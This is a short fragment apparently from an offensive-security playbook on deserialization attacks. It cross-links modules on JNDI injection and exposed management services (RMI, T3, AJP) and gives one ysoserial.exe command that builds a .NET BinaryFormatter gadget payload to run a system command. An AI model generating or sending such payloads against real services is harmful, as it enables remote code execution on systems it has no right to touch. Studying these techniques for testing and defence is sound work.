...
- [jndi-injection](../jndi-injection/MODULE.md) when deserialization leads to JNDI lookup (e.g., post-JDK 8u191 bypass via LDAP → deserialization)
- [unauthorized-access-common-services](../unauthorized-access-common-services/MODULE.md) when the deserialization endpoint is an exposed management service (RMI Registry, T3, AJP)
...
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c whoami > .\\out.txt" -o base64
